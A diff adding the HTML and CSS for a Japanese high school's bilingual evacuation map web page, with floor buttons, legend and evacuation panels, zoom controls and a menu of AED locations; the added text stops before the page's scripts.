@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="ja" translate="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta name="msapplication-visual-search" content="disabled">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <title>防災マップ | 法政大学国際高等学校</title>
+    
+    <!-- Google Tag Manager -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-K7KS677P9P"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-K7KS677P9P');
+    </script>
+
+    <style>
+        :root {
+            --bg-color: #f1f5f9;
+            --primary: #0f172a;
+            --primary-mid: #1e293b;
+            --primary-light: #334155;
+            --accent-blue: #2563eb;
+            --accent-blue-hover: #1d4ed8;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-red-dark: #dc2626;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --text-sub: #94a3b8;
+            --white: #ffffff;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+            --shadow-md: 0 10px 25px -5px rgba(15, 23, 42, 0.12), 0 8px 10px -6px rgba(15, 23, 42, 0.08);
+            --shadow-lg: 0 20px 35px -8px rgba(15, 23, 42, 0.22);
+            --header-height: 104px;
+        }
+
+        *, *::before, *::after {
+            margin: 0; padding: 0; box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+        }
+
+        img, svg, canvas {
+            -webkit-user-drag: none !important;
+            -khtml-user-drag: none !important;
+            -moz-user-drag: none !important;
+            -o-user-drag: none !important;
+            user-drag: none !important;
+            -webkit-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+            pointer-events: none !important;
+        }
+
+        button, .btn-ja, .btn-en, .panel-toggle, .nav-pill, .modal-close, .close-status, a {
+            pointer-events: auto !important;
+            cursor: pointer;
+        }
+
+        #map-container {
+            pointer-events: auto !important;
+        }
+        
+        body, html { 
+            height: 100%; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', Meiryo, sans-serif;
+            background-color: var(--bg-color);
+            background-image: radial-gradient(#cbd5e1 1.2px, transparent 1.2px);
+            background-size: 24px 24px;
+            color: var(--text-main);
+            overflow: hidden;
+            touch-action: none;
+        }
+
+        /* --- Header & Top Menu (Default: 2-Row Responsive Layout for iPad / Tablet) --- */
+        #header {
+            position: fixed; top: 0; left: 0; width: 100%; height: var(--header-height);
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 60%, #172554 100%);
+            color: var(--white);
+            display: flex; flex-direction: column; justify-content: space-between; z-index: 100;
+            box-shadow: 0 4px 20px -2px rgba(15, 23, 42, 0.4);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 8px 20px 10px;
+            backdrop-filter: blur(14px);
+        }
+
+        .header-top {
+            display: flex; align-items: center; justify-content: space-between;
+            height: 44px; width: 100%; min-width: 0; gap: 16px;
+        }
+
+        .school-info { display: flex; align-items: center; gap: 12px; min-width: 0; flex: 0 1 auto; }
+        .school-logo { height: 36px; width: auto; object-fit: contain; flex-shrink: 0; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
+        .school-titles { display: flex; flex-direction: column; min-width: 0; }
+        .school-name { font-size: 18px; font-weight: 800; letter-spacing: 0.6px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; line-height: 1.2; text-shadow: 0 1px 2px rgba(0,0,0,0.3); }
+        .school-name-en { font-size: 10px; font-weight: 500; color: #94a3b8; letter-spacing: 0.4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; line-height: 1.2; margin-top: 2px; }
+
+        .header-banner { height: 38px; max-width: 240px; object-fit: contain; opacity: 0.95; flex-shrink: 0; filter: drop-shadow(0 2px 6px rgba(0,0,0,0.25)); }
+
+        #top-menu {
+            display: flex; gap: 10px; padding: 0; overflow-x: auto;
+            scrollbar-width: none; -ms-overflow-style: none;
+            align-items: center; justify-content: center;
+            width: 100%; height: 42px;
+            touch-action: pan-x; -webkit-overflow-scrolling: touch;
+        }
+        #top-menu::-webkit-scrollbar { display: none; }
+
+        .menu-btn {
+            background: rgba(255,255,255,0.09); border: 1px solid rgba(255,255,255,0.14); color: rgba(255,255,255,0.92);
+            padding: 5px 16px; cursor: pointer;
+            border-radius: 22px; white-space: nowrap; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            line-height: 1; flex-shrink: 0; user-select: none;
+            backdrop-filter: blur(8px);
+        }
+        .menu-btn .btn-ja { font-size: 14px; font-weight: 700; line-height: 1.2; }
+        .menu-btn .btn-en { font-size: 9px; font-weight: 600; opacity: 0.75; letter-spacing: 0.4px; text-transform: uppercase; margin-top: 2px; }
+
+        .menu-btn:hover {
+            background: rgba(255,255,255,0.18);
+            border-color: rgba(255,255,255,0.28);
+            color: #ffffff;
+            transform: translateY(-1px);
+        }
+        .menu-btn:active { transform: scale(0.96); }
+        .menu-btn.active {
+            background: #ffffff;
+            color: var(--primary);
+            border-color: #ffffff;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.25), 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .menu-btn.active .btn-ja { color: #0f172a; }
+        .menu-btn.active .btn-en { color: #2563eb; opacity: 1; font-weight: 700; }
+
+        /* --- Desktop (width >= 1200px): Sleek 1-Row Grid Layout & Spacious Panels --- */
+        @media screen and (min-width: 1200px) {
+            :root {
+                --header-height: 76px;
+                --panel-side-offset: clamp(48px, 4.5vw, 84px);
+            }
+            #header {
+                display: grid;
+                grid-template-columns: auto 1fr auto;
+                grid-template-rows: 1fr;
+                align-items: center;
+                padding: 0 32px;
+                gap: 24px;
+            }
+            .header-top {
+                display: contents;
+            }
+            .school-info {
+                grid-column: 1;
+                grid-row: 1;
+                gap: 14px;
+            }
+            .school-logo { height: 42px; }
+            .school-name { font-size: 21px; }
+            .school-name-en { font-size: 11px; }
+            #top-menu {
+                grid-column: 2;
+                grid-row: 1;
+                height: 100%;
+                justify-content: center;
+                gap: 12px;
+                overflow: visible;
+            }
+            .menu-btn {
+                padding: 7px 20px;
+                border-radius: 26px;
+            }
+            .menu-btn .btn-ja { font-size: 15px; }
+            .menu-btn .btn-en { font-size: 10px; }
+            .header-banner {
+                grid-column: 3;
+                grid-row: 1;
+                height: 44px;
+                max-width: 260px;
+            }
+        }
+
+        /* --- Map Container --- */
+        #map-container {
+            width: 100%; height: 100%; padding-top: var(--header-height);
+            position: relative; overflow: hidden; cursor: grab;
+        }
+        #map-container:active { cursor: grabbing; }
+
+        #map-content {
+            width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;
+            transform-origin: center center;
+        }
+
+        #map-wrapper { position: relative; display: inline-block; }
+
+        #map-image {
+            display: block; max-width: 90vw; max-height: 75vh;
+            border-radius: 16px; box-shadow: var(--shadow-lg);
+            border: 1px solid rgba(15, 23, 42, 0.08);
+            pointer-events: none; /* Let the container handle interaction */
+        }
+
+        #aed-overlay-arrow {
+            position: absolute; z-index: 10; pointer-events: none;
+            display: none; opacity: 0; transform: translateY(-50%);
+            transition: opacity 0.4s ease;
+            filter: drop-shadow(0 6px 16px rgba(0,0,0,0.45));
+        }
+
+        /* --- Side Panels (Desktop) --- */
+        .side-panel {
+            position: absolute; top: 50%; transform: translateY(-50%);
+            z-index: 50; transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            pointer-events: auto;
+        }
+        .panel-content {
+            background: rgba(255, 255, 255, 0.98); border-radius: 22px; padding: 16px 18px 18px;
+            box-shadow: 0 12px 36px -4px rgba(15, 23, 42, 0.16), 0 4px 12px rgba(15, 23, 42, 0.08);
+            width: 340px; border: 1px solid rgba(15, 23, 42, 0.08);
+            backdrop-filter: blur(12px);
+        }
+        .panel-header {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 12px; padding-bottom: 9px; border-bottom: 1px solid #f1f5f9;
+        }
+        .panel-badge {
+            display: flex; flex-direction: column; line-height: 1.2;
+        }
+        .panel-title-ja { font-size: 15px; font-weight: 700; color: #0f172a; }
+        .panel-title-en { font-size: 11px; font-weight: 600; color: #64748b; letter-spacing: 0.3px; text-transform: uppercase; }
+
+        .panel-img-wrap { overflow: hidden; border-radius: 12px; border: 1px solid rgba(0,0,0,0.06); }
+        .panel-img-wrap img { width: 100%; display: block; border-radius: 10px; }
+
+        .panel-toggle {
+            position: absolute; top: 16px; background: #ffffff;
+            width: 36px; height: 36px; border-radius: 50%; border: 1px solid rgba(0,0,0,0.08);
+            box-shadow: var(--shadow-md); cursor: pointer; display: flex;
+            align-items: center; justify-content: center;
+            color: var(--primary); z-index: 51; transition: all 0.2s ease;
+        }
+        .panel-toggle:hover { background: #f8fafc; color: var(--accent-blue); transform: scale(1.08); }
+        .panel-toggle:active { transform: scale(0.92); }
+
+        #legend-panel { left: var(--panel-side-offset, 60px); }
+        #legend-panel.hidden { transform: translate(-380px, -50%); }
+        #legend-panel .panel-toggle { right: -18px; }
+
+        #evacuate-panel { right: var(--panel-side-offset, 60px); }
+        #evacuate-panel.hidden { transform: translate(380px, -50%); }
+        #evacuate-panel .panel-toggle { left: -18px; }
+
+        /* --- UI Controls --- */
+        #controls-right {
+            position: absolute; bottom: 30px; right: 30px;
+            display: flex; flex-direction: column; gap: 12px; z-index: 80;
+        }
+
+        #floor-menu {
+            position: absolute; bottom: 30px; left: 30px;
+            display: flex; flex-direction: column-reverse; gap: 10px; z-index: 80;
+        }
+
+        .control-group {
+            display: flex; flex-direction: column; background: rgba(255, 255, 255, 0.96);
+            border-radius: 16px; box-shadow: var(--shadow-md); overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+        }
+
+        .ctrl-btn {
+            background: transparent; border: none; width: 52px; height: 52px;
+            display: flex; justify-content: center; align-items: center;
+            cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            color: var(--primary); position: relative;
+        }
+        .ctrl-btn:hover { background: #f1f5f9; }
+        .ctrl-btn:active { transform: scale(0.94); }
+        .ctrl-btn svg { width: 24px; height: 24px; fill: currentColor; }
+
+        /* Floor buttons */
+        .floor-btn {
+            background: rgba(255, 255, 255, 0.96); border: 1.5px solid rgba(226, 232, 240, 0.9);
+            width: 50px; height: 50px;
+            border-radius: 50%; font-size: 17px; font-weight: 800;
+            box-shadow: var(--shadow-md); cursor: pointer; color: var(--primary);
+            display: flex; align-items: center; justify-content: center;
+            text-align: center; line-height: 1; padding: 0;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(12px);
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .floor-btn:hover { transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+        .floor-btn:active { transform: scale(0.94); }
+        .floor-btn.active {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            color: var(--white);
+            box-shadow: 0 6px 18px rgba(15, 23, 42, 0.4);
+            border-color: #334155;
+        }
+
+        /* AED Main Button */
+        .aed-main-btn {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: var(--white); border-radius: 50%; margin-bottom: 2px;
+            box-shadow: 0 4px 16px rgba(239, 68, 68, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.8);
+        }
+        .aed-main-btn:hover { background: linear-gradient(135deg, #f87171 0%, #ef4444 100%); transform: translateY(-1px); }
+        .aed-main-btn:active { transform: scale(0.94); }
+
+        /* Route Button (Bold Thick Blue Arrow) */
+        #route-btn {
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+        }
+        #route-btn.on {
+            color: #1d4ed8;
+            background: #eff6ff;
+            box-shadow: inset 0 0 0 2px #3b82f6, 0 4px 14px rgba(37, 99, 235, 0.25);
+        }
+        #route-btn.on .route-arrow-icon {
+            filter: drop-shadow(0 2px 4px rgba(29, 78, 216, 0.35));
+            transform: translateX(1px);
+        }
+        #route-btn.off {
+            color: #94a3b8;
+            background: #ffffff;
+            opacity: 0.65;
+        }
+        #route-btn.off:hover {
+            opacity: 0.9;
+            color: #64748b;
+        }
+
+        /* --- AED Menu & Status --- */
+        #aed-menu {
+            position: absolute; bottom: 220px; right: 90px;
+            background: rgba(255, 255, 255, 0.98); border-radius: 18px; box-shadow: var(--shadow-lg);
+            display: none; flex-direction: column; overflow: hidden; z-index: 90;
+            border: 1px solid rgba(15, 23, 42, 0.08); width: 320px;
+            backdrop-filter: blur(16px);
+        }
+        .aed-menu-header {
+            background: #f8fafc; padding: 12px 18px 10px; border-bottom: 1px solid #f1f5f9;
+        }
+        .aed-menu-title-ja { font-size: 13px; font-weight: 700; color: #0f172a; }
+        .aed-menu-title-en { font-size: 9.5px; font-weight: 600; color: #64748b; letter-spacing: 0.4px; text-transform: uppercase; margin-top: 1px; }
+
+        .aed-menu-item {
+            background: none; border: none; border-bottom: 1px solid #f8fafc;
+            padding: 12px 18px; color: var(--text-main);
+            cursor: pointer; text-align: left;
+            display: flex; align-items: center; gap: 12px;
+            transition: all 0.2s ease;
+        }
+        .aed-menu-item:hover { background: #fef2f2; color: var(--accent-red); }
+        .aed-menu-item:last-child { border-bottom: none; }
+        .aed-item-icon { font-size: 18px; flex-shrink: 0; }
+        .aed-item-info { display: flex; flex-direction: column; min-width: 0; line-height: 1.25; }
+        .aed-item-loc { font-size: 13.5px; font-weight: 700; color: inherit; }
+        .aed-item-loc-en { font-size: 10px; font-weight: 500; color: #64748b; margin-top: 2px; }
+
+        #status-bar {
+            position: fixed; top: calc(var(--header-height) + 12px); left: 50%; transform: translateX(-50%);
+            background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%);
+            color: var(--white); padding: 7px 18px;
+            border-radius: 30px; font-size: 14px; font-weight: 600; z-index: 110;
+            display: none; align-items: center; gap: 12px;
+            box-shadow: 0 8px 24px -4px rgba(239, 68, 68, 0.45);
+            max-width: calc(100vw - 32px); white-space: nowrap;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(8px);
+        }
+        .status-indicator { position: relative; width: 10px; height: 10px; display: flex; align-items: center; justify-content: center; }
+        .pulse-dot { width: 8px; height: 8px; background: #ffffff; border-radius: 50%; position: relative; z-index: 2; }
+        .pulse-ring {
+            position: absolute; width: 16px; height: 16px; border-radius: 50%;
+            background: rgba(255, 255, 255, 0.6);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.5); opacity: 1; }
+            100% { transform: scale(1.6); opacity: 0; }
+        }
+        .status-texts { display: flex; flex-direction: column; line-height: 1.2; }
+        #status-text { font-size: 13.5px; font-weight: 700; letter-spacing: 0.3px; }
+        .status-sub-en { font-size: 9.5px; font-weight: 500; opacity: 0.85; letter-spacing: 0.3px; }
+
+        #status-bar .close-status {
+            background: rgba(255,255,255,0.22); border: none; color: white;
+            width: 22px; height: 22px; border-radius: 50%; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; font-size: 15px;
+            line-height: 1; transition: background 0.2s;
+        }
+        #status-bar .close-status:hover { background: rgba(255,255,255,0.38); }
+
+        /* --- Mobile / Tablet Overlay Navigation --- */
+        #mobile-bottom-nav {
+            display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            background: rgba(15, 23, 42, 0.92); backdrop-filter: blur(16px);
+            padding: 6px 12px; border-radius: 36px;
+            align-items: center; gap: 8px; z-index: 100;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        .nav-pill {
+            background: transparent; border: none; color: var(--white);
+            padding: 6px 16px; cursor: pointer;
+            border-radius: 24px; white-space: nowrap;
+            display: flex; align-items: center; gap: 8px;
+            transition: all 0.2s ease;
+        }
+        .nav-pill:hover { background: rgba(255, 255, 255, 0.12); }
+        .nav-pill:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.96); }
+        .nav-pill .pill-icon { color: #60a5fa; flex-shrink: 0; }
+        .nav-pill .pill-labels { display: flex; flex-direction: column; align-items: flex-start; line-height: 1.15; }
+        .nav-pill .pill-title-ja { font-size: 13px; font-weight: 700; }
+        .nav-pill .pill-title-en { font-size: 9px; font-weight: 600; opacity: 0.75; letter-spacing: 0.3px; text-transform: uppercase; margin-top: 1px; }
+
+        .nav-pill-divider {
+            width: 1px; height: 24px; background: rgba(255, 255, 255, 0.18);
+        }
+
+        /* --- Modal (Mobile & Tablet) --- */
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15, 23, 42, 0.65); backdrop-filter: blur(8px);
+            z-index: 200; display: none;
+            justify-content: center; align-items: flex-end;
+        }
+        .modal-content {
+            background: var(--white); width: 100%; max-width: 640px; max-height: 85%;
+            border-radius: 28px 28px 0 0; padding: 16px 20px 24px; overflow-y: auto;
+            position: relative; animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            touch-action: pan-y; box-shadow: 0 -10px 40px rgba(0,0,0,0.3);
+        }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .modal-drag-handle {
+            width: 44px; height: 5px; background: #cbd5e1; border-radius: 3px;
+            margin: 0 auto 14px;
+        }
+        .modal-header-row {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        .modal-title-wrap { display: flex; flex-direction: column; }
+        .modal-title-ja { font-size: 19px; font-weight: 800; color: #0f172a; line-height: 1.2; }
+        .modal-title-en { font-size: 11px; font-weight: 600; color: #64748b; letter-spacing: 0.4px; text-transform: uppercase; margin-top: 2px; }
+
+        .modal-close {
+            background: #f1f5f9; border: none;
+            width: 34px; height: 34px; border-radius: 50%; font-size: 20px;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; color: #475569; transition: all 0.2s ease;
+        }
+        .modal-close:hover { background: #e2e8f0; color: #0f172a; }
+
+        /* --- Responsive Media Queries --- */
+        /* Tablet & Mobile (width < 1200px, includes iPad portrait & landscape) */
+        @media screen and (max-width: 1199px) {
+            :root { --header-height: 104px; }
+            #map-image { max-width: 95vw; max-height: 70vh; }
+            .side-panel { display: none; }
+            #mobile-bottom-nav { display: flex; }
+            #floor-menu { bottom: 88px; left: 20px; }
+            #controls-right { bottom: 88px; right: 20px; }
+            .ctrl-btn, .floor-btn { width: 48px; height: 48px; }
+            #aed-menu {
+                bottom: 145px; right: 20px; width: auto;
+                min-width: 270px; max-width: calc(100vw - 40px);
+            }
+        }
+
+        /* Smartphone (width < 768px) */
+        @media screen and (max-width: 767px) {
+            :root { --header-height: 94px; }
+            #header { padding: 5px 12px 7px; }
+            .header-top { height: 38px; gap: 8px; }
+            .school-info { gap: 8px; }
+            .school-logo { height: 28px; }
+            .school-name { font-size: 15px; }
+            .school-name-en { display: none; }
+            .header-banner { display: none; }
+            #top-menu { justify-content: flex-start; gap: 8px; height: 38px; padding: 0 4px; }
+            .menu-btn { padding: 5px 13px; border-radius: 20px; }
+            .menu-btn .btn-ja { font-size: 13px; }
+            .menu-btn .btn-en { font-size: 8.5px; }
+            
+            #floor-menu { bottom: 80px; left: 14px; }
+            #controls-right { bottom: 80px; right: 14px; }
+            .ctrl-btn, .floor-btn { width: 44px; height: 44px; }
+            .floor-btn { font-size: 15px; }
+            #mobile-bottom-nav { bottom: 14px; padding: 5px 10px; }
+            .nav-pill { padding: 5px 12px; gap: 6px; }
+            .nav-pill .pill-title-ja { font-size: 12px; }
+            .nav-pill .pill-title-en { font-size: 8.5px; }
+            #status-bar { padding: 6px 14px; top: calc(var(--header-height) + 8px); }
+            #status-text { font-size: 12.5px; }
+        }
+
+        /* --- Security Shield (DevTools Detection) --- */
+        #security-shield {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(15, 23, 42, 0.94); backdrop-filter: blur(24px);
+            z-index: 999999; display: flex; align-items: center; justify-content: center;
+            color: white; text-align: center; padding: 24px;
+        }
+        .shield-card {
+            background: rgba(30, 41, 59, 0.95); border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px; padding: 36px 32px; max-width: 500px; width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: shieldPop 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        @keyframes shieldPop {
+            from { opacity: 0; transform: scale(0.92); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .shield-icon {
+            width: 72px; height: 72px; margin: 0 auto 20px;
+            background: rgba(239, 68, 68, 0.15); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            border: 2px solid rgba(239, 68, 68, 0.3);
+        }
+        .shield-card h2 {
+            font-size: 20px; font-weight: 800; margin-bottom: 12px; color: #f8fafc;
+        }
+        .shield-card p {
+            font-size: 14px; line-height: 1.6; color: #cbd5e1; margin-bottom: 20px;
+        }
+        .shield-hint {
+            font-size: 12px; color: #94a3b8; border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 14px;
+        }
+    </style>
+</head>
+<body>
+    <header id="header">
+        <div class="header-top">
+            <div class="school-info">
+                <img src="images/ロゴ.png" class="school-logo" alt="ロゴ" onerror="this.style.display='none'">
+                <div class="school-titles">
+                    <span class="school-name">法政大学国際高等学校 避難マップ</span>
+                    <span class="school-name-en">Hosei Univ. International High School Evacuation Map</span>
+                </div>
+            </div>
+            <img src="images/メッセージ.png" class="header-banner" alt="メッセージ" onerror="this.style.display='none'">
+        </div>
+        <nav id="top-menu"></nav>
+    </header>
+
+    <div id="status-bar">
+        <div class="status-indicator">
+            <span class="pulse-ring"></span>
+            <span class="pulse-dot"></span>
+        </div>
+        <div class="status-texts">
+            <span id="status-text">AEDの場所を表示中</span>
+            <span class="status-sub-en">AED Location</span>
+        </div>
+        <button class="close-status" onclick="hideAedArrow()" title="閉じる">×</button>
+    </div>
+
+    <div id="map-container">
+        <div id="map-content">
+            <div id="map-wrapper">
+                <img id="map-image" src="" alt="防災マップ" onerror="this.src='https://placehold.jp/24/1e293b/ffffff/800x600.png?text=画像準備中';">
+                <img id="aed-overlay-arrow" src="images/矢印_AED.png" alt="AED位置">
+            </div>
+        </div>
+    </div>
+
+    <!-- Side Panels (Desktop) -->
+    <aside id="legend-panel" class="side-panel">
+        <button class="panel-toggle" onclick="togglePanel('legend-panel')" title="凡例の開閉">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+        </button>
+        <div class="panel-content">
+            <div class="panel-header">
+                <div class="panel-badge">
+                    <span class="panel-title-ja">凡例</span>
+                    <span class="panel-title-en">Legend</span>
+                </div>
+            </div>
+            <div class="panel-img-wrap">
+                <img src="images/凡例.png" alt="凡例" draggable="false" oncontextmenu="return false;" data-visualcompletion="ignore">
+            </div>
+        </div>
+    </aside>
+
+    <aside id="evacuate-panel" class="side-panel">
+        <button class="panel-toggle" onclick="togglePanel('evacuate-panel')" title="避難手順の開閉">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+        </button>
+        <div class="panel-content">
+            <div class="panel-header">
+                <div class="panel-badge">
+                    <span class="panel-title-ja">避難のしかた</span>
+                    <span class="panel-title-en">How to Evacuate</span>
+                </div>
+            </div>
+            <div class="panel-img-wrap">
+                <img src="images/避難のしかた.png" alt="避難のしかた" draggable="false" oncontextmenu="return false;" data-visualcompletion="ignore">
+            </div>
+        </div>
+    </aside>
+
+    <!-- Mobile Navigation -->
+    <div id="mobile-bottom-nav">
+        <button class="nav-pill" onclick="openModal('legend')">
+            <svg class="pill-icon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                <polyline points="2 17 12 22 22 17"></polyline>
+                <polyline points="2 12 12 17 22 12"></polyline>
+            </svg>
+            <div class="pill-labels">
+                <span class="pill-title-ja">凡例</span>
+                <span class="pill-title-en">Legend</span>
+            </div>
+        </button>
+        <div class="nav-pill-divider"></div>
+        <button class="nav-pill" onclick="openModal('evacuate')">
+            <svg class="pill-icon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
+            <div class="pill-labels">
+                <span class="pill-title-ja">避難のしかた</span>
+                <span class="pill-title-en">How to Evacuate</span>
+            </div>
+        </button>
+    </div>
+
+    <!-- Modals (Mobile & Tablet) -->
+    <div id="modal-overlay" class="modal" onclick="closeModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <div class="modal-drag-handle"></div>
+            <div class="modal-header-row">
+                <div class="modal-title-wrap">
+                    <h3 id="modal-title" class="modal-title-ja">タイトル</h3>
+                    <span id="modal-subtitle" class="modal-title-en">Title</span>
+                </div>
+                <button class="modal-close" onclick="closeModal()">×</button>
+            </div>
+            <div id="modal-body"></div>
+        </div>
+    </div>
+
+    <!-- Floor Menu -->
+    <div id="floor-menu"></div>
+
+    <!-- Controls -->
+    <div id="controls-right">
+        <div class="control-group">
+            <button class="ctrl-btn aed-main-btn" onclick="toggleAedMenu()" title="AEDの場所 / AED Locations">
+                <img src="images/AED.png" style="width: 28px; height: 28px; object-fit: contain;">
+            </button>
+        </div>
+        <div class="control-group">
+            <button id="route-btn" class="ctrl-btn on" onclick="toggleRoute()" title="避難経路の表示切替 / Evacuation Route">
+                <svg class="route-arrow-icon" viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="3" y1="12" x2="19" y2="12"></line>
+                    <polyline points="12 5 19 12 12 19"></polyline>
+                </svg>
+            </button>
+        </div>
+        <div class="control-group">
+            <button class="ctrl-btn" onclick="zoomMap(0.3)" title="拡大 / Zoom In">
+                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14zM10 7h-1v2H7v1h2v2h1v-2h2V9h-2V7z"/></svg>
+            </button>
+            <button class="ctrl-btn" onclick="zoomMap(-0.3)" title="縮小 / Zoom Out">
+                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 14zM7 9h5v1H7V9z"/></svg>
+            </button>
+            <button class="ctrl-btn" onclick="resetZoom()" title="リセット / Reset View">
+                <svg viewBox="0 0 24 24"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3A8.994 8.994 0 0 0 13 3.06V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06a8.994 8.994 0 0 0 7.94 7.94V23h2v-2.06a8.994 8.994 0 0 0 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- AED Menu -->
+    <div id="aed-menu">
+        <div class="aed-menu-header">
+            <div class="aed-menu-title-ja">AED 設置場所</div>
+            <div class="aed-menu-title-en">AED Locations</div>
+        </div>
+        <button class="aed-menu-item" onclick="triggerAed('2号館', '1F', '2gokan-1f', '2号館：女子トイレ入口前')">
+            <span class="aed-item-icon">📍</span>
+            <div class="aed-item-info">
+                <span class="aed-item-loc">2号館 1F：女子トイレ入口前</span>
+                <span class="aed-item-loc-en">Bldg. 2, 1F - Women's Restroom</span>
+            </div>
+        </button>
+        <button class="aed-menu-item" onclick="triggerAed('2号館', '2F', '2gokan-2f', 'ピロティ側階段：2階')">
+            <span class="aed-item-icon">📍</span>
+            <div class="aed-item-info">
+                <span class="aed-item-loc">2号館 2F：ピロティ側階段</span>
+                <span class="aed-item-loc-en">Bldg. 2, 2F - Pilotis-side Stairs</span>
+            </div>
+        </button>
+        <button class="aed-menu-item" onclick="triggerAed('体育館', '1F', 'gym-1f', '体育館1階：オレンジの間入口')">
+            <span class="aed-item-icon">📍</span>
+            <div class="aed-item-info">
+                <span class="aed-item-loc">体育館 1F：オレンジの間入口</span>
+                <span class="aed-item-loc-en">Gym, 1F - Orange Room Entrance</span>
+            </div>
+        </button>
+    </div>
+
+    
